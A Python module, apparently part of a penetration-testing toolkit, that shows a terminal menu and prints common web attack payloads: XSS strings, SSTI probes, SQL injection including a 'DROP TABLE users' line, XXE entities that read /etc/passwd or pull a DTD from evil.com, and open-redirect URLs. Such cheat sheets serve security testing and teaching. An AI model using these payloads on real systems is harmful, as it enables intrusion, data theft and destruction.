from colorama import Fore, Style

def exploits_menu():
    print("\n1. XSS (Cross-Site Scripting)")
    print("2. SSTI (Server-Side Template Injection)")
    print("3. SQL Injection")
    print("4. XXE (XML External Entity Injection)")
    print("5. Open Redirect")
    print("6. Go Back\n")

    choice = input(Fore.CYAN + "Select an exploit: " + Style.RESET_ALL)

    exploits = {
        "1": xss_exploits,
        "2": ssti_exploits,
        "3": sql_injection_exploits,
        "4": xxe_exploits,
        "5": open_redirect_exploits
    }

    if choice in exploits:
        exploits[choice]()
    elif choice == "6":
        from core.main_menu import main_menu
        main_menu()
    else:
        print(Fore.RED + "Invalid choice!" + Style.RESET_ALL)
        exploits_menu()

def xss_exploits():
    print(Fore.YELLOW + "\n[+] XSS Payloads:" + Style.RESET_ALL)
    payloads = [
        "<script>alert('XSS');</script>",
        "\"><script>alert('XSS');</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>"
    ]
    print_payloads(payloads)

def ssti_exploits():
    print(Fore.YELLOW + "\n[+] SSTI Exploits by Template Engine:" + Style.RESET_ALL)
    payloads = {
        "Jinja2": ["{{ 7 * 7 }}", "{{ request.__class__.__mro__[2].__subclasses__() }}"],
        "Twig": ["{{ 7 * 7 }}", "{{ _self }}"],
        "Smarty": ["{7*7}", "{php}echo 7*7;{/php}"],
        "Velocity": ["#set($x = 7 * 7) $x", "#evaluate('7 * 7')"]
    }
    print_service_payloads(payloads)

def sql_injection_exploits():
    print(Fore.YELLOW + "\n[+] SQL Injection Payloads:" + Style.RESET_ALL)
    payloads = [
        "' OR 1=1 --",
        "' UNION SELECT null, username, password FROM users --",
        "'; DROP TABLE users; --",
        "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --"
    ]
    print_payloads(payloads)

def xxe_exploits():
    print(Fore.YELLOW + "\n[+] XXE Exploit Payloads:" + Style.RESET_ALL)
    payloads = [
        """<?xml version="1.0"?>
        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
        <foo>&xxe;</foo>""",
        
        """<?xml version="1.0"?>
        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/malicious.dtd">]>
        <foo>&xxe;</foo>"""
    ]
    print_payloads(payloads)

def open_redirect_exploits():
    print(Fore.YELLOW + "\n[+] Open Redirect Payloads:" + Style.RESET_ALL)
    payloads = [
        "https://target.com/login?redirect=https://evil.com",
        "https://target.com/redirect?url=//evil.com"
    ]
    print_payloads(payloads)

def print_payloads(payloads):
    for p in payloads:
        print(Fore.GREEN + p + Style.RESET_ALL)
    input(Fore.CYAN + "\nPress Enter to return to exploits menu..." + Style.RESET_ALL)
    exploits_menu()

def print_service_payloads(payloads):
    for service, payload_list in payloads.items():
        print(Fore.CYAN + f"\n[+] {service}:" + Style.RESET_ALL)
        for p in payload_list:
            print(Fore.GREEN + p + Style.RESET_ALL)
    input(Fore.CYAN + "\nPress Enter to return to exploits menu..." + Style.RESET_ALL)
    exploits_menu()
